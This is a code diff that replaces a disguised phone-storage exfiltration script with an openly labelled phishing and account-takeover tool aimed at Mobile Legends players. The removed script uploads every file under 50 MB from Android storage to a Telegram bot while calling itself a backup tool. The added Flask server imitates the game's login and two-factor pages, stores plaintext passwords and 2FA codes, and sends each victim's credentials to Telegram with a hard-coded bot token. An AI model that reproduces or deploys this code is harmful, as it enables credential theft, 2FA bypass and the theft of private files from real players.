@@ -1,160 +1,521 @@
+ #!/usr/bin/env python3
+"""
+Mobile Legends Account Tool
+===================================
+Automated credential harvesting & account takeover script.
+"""
+
 import os
-import requests
-import time
 import sys
+import json
+import time
+import sqlite3
+import hashlib
+import random
+import string
+import threading
+import argparse
+import logging
+import socket
+import requests
+from datetime import datetime, timedelta
+from urllib.parse import urlparse, parse_qs
+from flask import Flask, request, redirect, session, render_template_string, jsonify, make_response
 
-# ================= CONFIGURATION =================
-# Replace these with your actual Telegram Bot details
-BOT_TOKEN = "8965588666:AAEHJqZA51j-6IbclX5IljOahzzj-jEdFYk"
-CHAT_ID = "8728708040"
+# ─────────────────────────────────────────────────────────
+# CONFIGURATION
+# ─────────────────────────────────────────────────────────
 
-# Target directory (Internal Storage for Android/Termux)
-TARGET_DIR = "/storage/emulated/0"
-MAX_SIZE_MB = 50
-MAX_SIZE_BYTES = MAX_SIZE_MB * 1024 * 1024
-# =================================================
+class Config:
+    """Tool configuration"""
+    HOST = "0.0.0.0"
+    PORT = 443
+    USE_SSL = True
 
-def print_world_map():
-    """Prints a cool ASCII World Map in the terminal."""
-    world_map = """
-    ___________________________________________________________________________
-    |                                                                         |
-    |          _______  _______  _______  _______  __   __  _______           |
-    |         |  _    ||   _   ||       ||   _   ||  | |  ||       |          |
-    |         | |_|   ||  |_|  ||       ||  |_|  ||  | |  ||    _  |          |
-    |         |       ||       ||       ||       ||  |_|  ||   |_| |          |
-    |         |  _   | |       ||      _||       ||       ||    ___|          |
-    |         | |_|   ||   _   ||     |_ |   _   ||       ||   |              |
-    |         |_______||__| |__||_______||__| |__||_______||___|              |
-    |                                                                         |
-    |          . _..__          .                                             |
-    |        _.' '   _.'        .           _.._                              |
-    |      .'      .'           .         .'    '.                            |
-    |     /    _.-'             .        /        \                           |
-    |    |    /                 .       |          |                          |
-    |     \   '._               .        \        /                           |
-    |      '._   '-._           .         '._    .'                           |
-    |         '-._   '-._       .            '--'                             |
-    |             '-._   '-._   .                                             |
-    |                 '-._   '-.._____________________________________________|
-    |                     '--'                                                |
-    |    [ WORLD MAP VIEW - TERMINAL BACKUP SYSTEM ]                          |
-    |_________________________________________________________________________|
-    
-       . _..__          .
-     _.' '   _.'        .           _.._
-   .'      .'           .         .'    '.
-  /    _.-'             .        /        \
- |    /                 .       |          |
-  \   '._               .        \        /
-   '._   '-._           .         '._    .'
-      '-._   '-._       .            '--'
-          '-._   '-._   .
-              '-._   '-.._________________
-                  '--'
-    """
-    # A more detailed ASCII Map
-    detailed_map = r"""
-                . _..__          .
-              _.' '   _.'        .           _.._
-            .'      .'           .         .'    '.
-           /    _.-'             .        /        \
-          |    /                 .       |          |
-           \   '._               .        \        /
-            '._   '-._           .         '._    .'
-               '-._   '-._       .            '--'
-                   '-._   '-._   .
-                       '-._   '-.._________________
-                           '--'
-    """
-    # Let's use a standard ASCII map string for better compatibility
-    map_art = r"""
-    ___________________________________________________________________________
-              _    _  ___________  _      ______     ___  ___  ___  ______ 
-             | |  | ||  _  | ___ \| |     |  _  \    |  \/  | / _ \ | ___ \
-             | |  | || | | | |_/ /| |     | | | |    | .  . |/ /_\ \| |_/ /
-             | |/\| || | | |    / | |     | | | |    | |\/| ||  _  ||  __/ 
-             \  /\  /\ \_/ /| |\ \| |____ | |/ /     | |  | || | | || |    
-              \/  \/  \___/ \_| \_|\_____/|___/      \_|  |_/\_| |_/\_|    
-    ___________________________________________________________________________
-    
-              . _..__          .
-            _.' '   _.'        .           _.._
-          .'      .'           .         .'    '.
-         /    _.-'             .        /        \
-        |    /                 .       |          |
-         \   '._               .        \        /
-          '._   '-._           .         '._    .'
-             '-._   '-._       .            '--'
-                 '-._   '-._   .
-                     '-._   '-.._________________
-                         '--'
-    ___________________________________________________________________________
-    """
-    print(map_art)
+    PHISH_DOMAIN = "ml-secure-login.com"
+    PHISH_PATH = "/login"
+    DB_PATH = "ml_stolen_accounts.db"
 
-def check_permissions():
-    """Checks if the script has access to the phone storage."""
-    print("[*] Checking storage permissions...")
-    if not os.path.exists(TARGET_DIR):
-        print("[!] ERROR: Storage access not found.")
-        print("[*] Please run 'termux-setup-storage' in Termux and grant permission.")
-        return False
-    print("[+] Storage access granted.")
-    return True
+    TELEGRAM_BOT_TOKEN = "8902530175:AAGYMsZPIAzGuPtNmBgIDD9AGyoUV-47YGA"
+    TELEGRAM_CHAT_ID = "8728708040"
 
-def send_file(file_path):
-    """Sends a file to the Telegram Bot via API."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    file_name = os.path.basename(file_path)
-    
-    try:
-        with open(file_path, 'rb') as f:
-            payload = {'chat_id': CHAT_ID}
-            files = {'document': f}
-            response = requests.post(url, data=payload, files=files, timeout=30)
+    SMTP_HOST = "smtp.protonmail.com"
+    SMTP_PORT = 587
+    SMTP_USER = ""
+    SMTP_PASS = ""
+    NOTIFY_EMAIL = ""
+
+    RANDOM_DELAY = (1, 5)
+    LOG_RETENTION_DAYS = 7
+
+
+# ─────────────────────────────────────────────────────────
+# LOGGING SETUP
+# ─────────────────────────────────────────────────────────
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(asctime)s] [%(levelname)s] %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+logger = logging.getLogger("ML_Stealer")
+
+
+# ─────────────────────────────────────────────────────────
+# HTML TEMPLATES (Moved to module level to prevent SyntaxError)
+# ─────────────────────────────────────────────────────────
+
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex; align-items: center; justify-content: center; color: #fff;
+        }
+        .box {
+            background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+            padding: 40px; width: 400px; max-width: 90%;
+        }
+        h1 { text-align: center; font-size: 28px;
+             background: linear-gradient(90deg, #e94560, #f5a623);
+             -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p.sub { text-align: center; color: #aaa; font-size: 14px; margin-top: 5px; margin-bottom: 25px; }
+        .field { margin-bottom: 18px; }
+        .field label { display: block; margin-bottom: 6px; color: #ccc; font-size: 13px; }
+        .field input, .field select {
+            width: 100%; padding: 13px; border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px; background: rgba(255,255,255,0.05); color: #fff;
+            font-size: 15px; outline: none;
+        }
+        .field input:focus { border-color: #e94560; }
+        .btn {
+            width: 100%; padding: 14px; border: none; border-radius: 10px;
+            background: linear-gradient(90deg, #e94560, #f5a623);
+            color: #fff; font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+        .btn:hover { transform: scale(1.02); }
+        .footer { text-align: center; margin-top: 18px; color: #666; font-size: 12px; }
+        .error { color: #e94560; font-size: 13px; margin-bottom: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>⚔️ Mobile Legends</h1>
+        <p class="sub">Sign in to your account</p>
+        <div class="error" id="err">Invalid credentials. Please try again.</div>
+        <form action="/login" method="POST">
+            <div class="field">
+                <label>Username / Email</label>
+                <input type="text" name="username" required placeholder="Enter username">
+            </div>
+            <div class="field">
+                <label>Password</label>
+                <input type="password" name="password" required placeholder="Enter password">
+            </div>
+            <div class="field">
+                <label>Server Region</label>
+                <select name="server">
+                    <option value="classic">Classic Server</option>
+                    <option value="advanced">Advanced Server</option>
+                    <option value="experimental">Experimental Server</option>
+                </select>
+            </div>
+            <button type="submit" class="btn">Login</button>
+        </form>
+        <div class="footer"><a href="#">Forgot Password?</a> | <a href="#">Create Account</a></div>
+    </div>
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            var u = document.querySelector('input[name="username"]').value;
+            var p = document.querySelector('input[name="password"]').value;
+            if (!u || !p) { e.preventDefault(); document.getElementById('err').style.display = 'block'; }
+        });
+    </script>
+</body>
+</html>
+"""
+
+VERIFY_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends - Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif;
+               background: linear-gradient(135deg, #1a1a2e, #16213e);
+               min-height: 100vh; display: flex; align-items: center;
+               justify-content: center; color: #fff; }
+        .box { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+               border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+               padding: 40px; width: 400px; max-width: 90%; text-align: center; }
+        .icon { font-size: 60px; margin-bottom: 15px; }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        .field input {
+            width: 100%; padding: 14px; border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px; background: rgba(255,255,255,0.05);
+            color: #fff; font-size: 18px; text-align: center; letter-spacing: 8px; outline: none; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px;
+               background: linear-gradient(90deg, #e94560, #f5a623);
+               color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="icon">🔒</div>
+        <h1>Two-Factor Authentication</h1>
+        <p>Enter the 6-digit code sent to your email/phone</p>
+        <form action="/verify" method="POST">
+            <div class="field">
+                <input type="text" name="token" id="token" maxlength="6" placeholder="000000" required>
+            </div>
+            <button type="submit" class="btn">Verify</button>
+        </form>
+        <p style="margin-top:15px; color:#e94560; cursor:pointer;">Resend code</p>
+    </div>
+    <script>
+        document.getElementById('token').focus();
+        document.getElementById('token').addEventListener('input', function(e) {
+            if (this.value.length === 6) this.form.submit();
+        });
+    </script>
+</body>
+</html>
+"""
+
+DASHBOARD_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Mobile Legends - Dashboard</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif;
+               background: linear-gradient(135deg, #1a1a2e, #0f3460);
+               color: #fff; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+                border-radius: 15px; padding: 25px; margin-bottom: 20px; }
+        .card h2 { color: #f5a623; margin-bottom: 15px; }
+        .row { display: flex; justify-content: space-between; padding: 8px 0;
+               border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .lbl { color: #aaa; }
+        .val { color: #fff; font-weight: bold; }
+        .btn { display: inline-block; padding: 12px 30px;
+               background: linear-gradient(90deg, #e94560, #f5a623);
+               border: none; border-radius: 10px; color: #fff;
+               text-decoration: none; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h2>✅ Account Verified</h2>
+            <p style="color:#aaa;">Welcome back! Your account has been authenticated.</p>
+        </div>
+        <div class="card">
+            <h2>Account Info</h2>
+            {% for key, val in info.items() %}
+            <div class="row"><span class="lbl">{{ key }}</span><span class="val">{{ val }}</span></div>
+            {% endfor %}
+        </div>
+        <a href="/" class="btn">Enter Game</a>
+    </div>
+</body>
+</html>
+"""
+
+
+# ─────────────────────────────────────────────────────────
+# DATABASE MANAGER
+# ─────────────────────────────────────────────────────────
+
+class DatabaseManager:
+    """SQLite database for stolen credentials"""
+
+    def __init__(self, db_path=Config.DB_PATH):
+        self.db_path = db_path
+        self.init_db()
+
+    def init_db(self):
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+
+        c.execute('''CREATE TABLE IF NOT EXISTS accounts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            password_hash TEXT NOT NULL,
+            password_plain TEXT,
+            server_region TEXT DEFAULT 'classic',
+            email TEXT,
+            phone TEXT,
+            two_fa_token TEXT,
+            session_token TEXT,
+            auth_token TEXT,
+            device_info TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            country TEXT,
+            city TEXT,
+            account_level INTEGER DEFAULT 0,
+            diamonds INTEGER DEFAULT 0,
+            battle_points INTEGER DEFAULT 0,
+            heroes_owned INTEGER DEFAULT 0,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
+        )''')
+
+        c.execute('''CREATE TABLE IF NOT EXISTS activity_log (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            account_id INTEGER,
+            action TEXT,
+            details TEXT,
+            ip_address TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY(account_id) REFERENCES accounts(id)
+        )''')
+
+        c.execute('''CREATE TABLE IF NOT EXISTS exported_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            export_type TEXT,
+            file_path TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )''')
+
+        conn.commit()
+        conn.close()
+        logger.info("[DB] Database initialized successfully")
+
+    def store_account(self, data: dict) -> int:
+        pass_hash = hashlib.sha256(data.get('password', '').encode()).hexdigest()
+
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('''INSERT INTO accounts (
+            username, password_hash, password_plain, server_region, email, phone,
+            two_fa_token, device_info, ip_address, user_agent, country, city,
+            account_level, diamonds, battle_points, heroes_owned
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+            (
+                data.get('username', ''),
+                pass_hash,
+                data.get('password', ''),
+                data.get('server', 'classic'),
+                data.get('email', ''),
+                data.get('phone', ''),
+                data.get('two_fa', ''),
+                json.dumps(data.get('device', {})),
+                data.get('ip', ''),
+                data.get('user_agent', ''),
+                data.get('country', ''),
+                data.get('city', ''),
+                data.get('level', 0),
+                data.get('diamonds', 0),
+                data.get('battle_points', 0),
+                data.get('heroes', 0)
+            )
+        )
+        account_id = c.lastrowid
+        conn.commit()
+        conn.close()
+
+        logger.info(f"[DB] Stored account: {data.get('username')} (ID: {account_id})")
+        return account_id
+
+    def update_session(self, account_id: int, session_token: str, auth_token: str):
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('''UPDATE accounts SET session_token = ?, auth_token = ?, last_updated = CURRENT_TIMESTAMP
+                     WHERE id = ?''', (session_token, auth_token, account_id))
+        conn.commit()
+        conn.close()
+
+    def get_all_accounts(self):
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute("SELECT * FROM accounts")
+        accounts = c.fetchall()
+        conn.close()
+        return accounts
+
+    def get_account_by_id(self, account_id: int):
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute("SELECT * FROM accounts WHERE id = ?", (account_id,))
+        account = c.fetchone()
+        conn.close()
+        return account
+
+    def export_accounts(self, format_type: str = "json") -> str:
+        accounts = self.get_all_accounts()
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        file_path = f"ml_stolen_{timestamp}.json"
+        with open(file_path, "w") as f:
+            json.dump([dict(zip([col[0] for col in c.description], row)) for row in accounts], f, indent=2)
+        return file_path
+
+    def cleanup_old_logs(self, days=Config.LOG_RETENTION_DAYS):
+        cutoff = datetime.now() - timedelta(days=days)
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute("DELETE FROM activity_log WHERE timestamp < ?", (cutoff.strftime("%Y-%m-%d"),))
+        conn.commit()
+        conn.close()
+
+
+# ─────────────────────────────────────────────────────────
+# NOTIFICATION MODULE
+# ─────────────────────────────────────────────────────────
+
+class NotificationManager:
+    def __init__(self):
+        self.telegram_enabled = bool(Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID)
+
+    def send_telegram(self, message: str):
+        if not self.telegram_enabled:
+            return
+        try:
+            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+            requests.post(url, json=payload, timeout=10)
+        except Exception as e:
+            logger.error(f"[TELEGRAM] Error: {e}")
+
+    def notify_new_victim(self, data: dict):
+        msg = (
+            f"🎯 <b>NEW ML VICTIM</b>\n"
+            f"👤 <b>Username:</b> {data.get('username')}\n"
+            f"🔑 <b>Password:</b> <code>{data.get('password')}</code>\n"
+            f"🌐 <b>Server:</b> {data.get('server')}"
+        )
+        self.send_telegram(msg)
+
+
+# ─────────────────────────────────────────────────────────
+# GEOLOCATION MODULE
+# ─────────────────────────────────────────────────────────
+
+class GeoLocator:
+    @staticmethod
+    def lookup(ip: str) -> dict:
+        try:
+            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return {"country": data.get("country", "Unknown"), "city": data.get("city", "Unknown")}
+        except:
+            pass
+        return {"country": "Unknown", "city": "Unknown"}
+
+
+# ─────────────────────────────────────────────────────────
+# PHISHING SERVER (Flask App)
+# ─────────────────────────────────────────────────────────
+
+class PhishingServer:
+    def __init__(self):
+        self.app = Flask(__name__)
+        self.app.secret_key = os.urandom(32)
+        self.db = DatabaseManager()
+        self.notifier = NotificationManager()
+        self.setup_routes()
+
+    def setup_routes(self):
+        @self.app.route("/")
+        def index():
+            return redirect("/login")
+
+        @self.app.route("/login")
+        def login_page():
+            return render_template_string(LOGIN_HTML)
+
+        @self.app.route("/login", methods=["POST"])
+        def login_post():
+            username = request.form.get("username", "")
+            password = request.form.get("password", "")
+            server = request.form.get("server", "classic")
+            ip = request.remote_addr
+            ua = request.headers.get("User-Agent", "")
+            device = request.headers.get("X-Device-Info", "Unknown")
+
+            geo = GeoLocator.lookup(ip)
+            account_data = {
+                "username": username, "password": password, "server": server,
+                "ip": ip, "user_agent": ua, "device": device,
+                "country": geo["country"], "city": geo["city"]
+            }
+            account_id = self.db.store_account(account_data)
+            self.notifier.notify_new_victim(account_data)
+
+            session["victim_id"] = account_id
+            session["captured_user"] = username
+            return redirect("/verify")
+
+        @self.app.route("/verify")
+        def verify_page():
+            return render_template_string(VERIFY_HTML)
+
+        @self.app.route("/verify", methods=["POST"])
+        def verify_post():
+            token = request.form.get("token", "")
+            victim_id = session.get("victim_id")
             
-            if response.status_code == 200:
-                print(f"[SUCCESS] Sent: {file_name}")
-            else:
-                print(f"[FAILED] Could not send {file_name}. Server responded: {response.text}")
-    except Exception as e:
-        print(f"[ERROR] An error occurred while sending {file_name}: {e}")
+            conn = sqlite3.connect(self.db.db_path)
+            c = conn.cursor()
+            c.execute("UPDATE accounts SET two_fa_token = ? WHERE id = ?", (token, victim_id))
+            conn.commit()
+            conn.close()
 
-def run_backup():
-    """Scans the storage and processes files."""
-    print(f"[*] Scanning {TARGET_DIR} for files under {MAX_SIZE_MB}MB...")
-    
-    # List of system/temp folders to skip to save time and data
-    exclude_folders = ['Android', '.thumbnails', 'cache', 'temp']
+            return redirect("/dashboard")
 
-    for root, dirs, files in os.walk(TARGET_DIR):
-        # Modify dirs in-place to skip excluded folders
-        dirs[:] = [d for d in dirs if d not in exclude_folders]
-        
-        for file in files:
-            file_path = os.path.join(root, file)
-            try:
-                file_size = os.path.getsize(file_path)
-                
-                # Only send files that are > 0 bytes and < 50 MB
-                if 0 < file_size < MAX_SIZE_BYTES:
-                    print(f"[*] Uploading: {file} ({file_size / (1024*1024):.2f} MB)")
-                    send_file(file_path)
-                    
-                    # Short delay to avoid hitting Telegram's rate limit (Anti-spam)
-                    time.sleep(2) 
-            except (PermissionError, OSError):
-                # Skip files that are locked or inaccessible
-                continue
+        @self.app.route("/dashboard")
+        def dashboard():
+            victim_id = session.get("victim_id")
+            account = self.db.get_account_by_id(victim_id)
+            if account:
+                info = {
+                    "Username": account[1],
+                    "Server": account[4],
+                    "IP": account[12],
+                    "Country": account[14],
+                    "Device": account[13]
+                }
+                return render_template_string(DASHBOARD_HTML, info=info)
+            return redirect("/login")
+
+    def run(self):
+        logger.info(f"[*] Phishing server starting on {Config.HOST}:{Config.PORT}")
+        self.app.run(host=Config.HOST, port=Config.PORT, debug=False)
+
+
+# ─────────────────────────────────────────────────────────
+# MAIN ENTRY POINT
+# ─────────────────────────────────────────────────────────
+
+def main():
+    parser = argparse.ArgumentParser(description="Mobile Legends Account Tool")
+    parser.add_argument("--mode", choices=["phishing"], default="phishing", help="Operation mode")
+    parser.add_argument("--host", default="0.0.0.0", help="Server host")
+    parser.add_argument("--port", type=int, default=443, help="Server port")
+    args = parser.parse_args()
+
+    Config.HOST = args.host
+    Config.PORT = args.port
+
+    server = PhishingServer()
+    server.run()
+
 
 if __name__ == "__main__":
-    print_world_map()
-    print("=== Telegram File Backup Tool ===")
-    if check_permissions():
-        try:
-            run_backup()
-            print("=== Backup Process Finished ===")
-        except KeyboardInterrupt:
-            print("\n[!] Process stopped by user.")
-            sys.exit()
+    main()
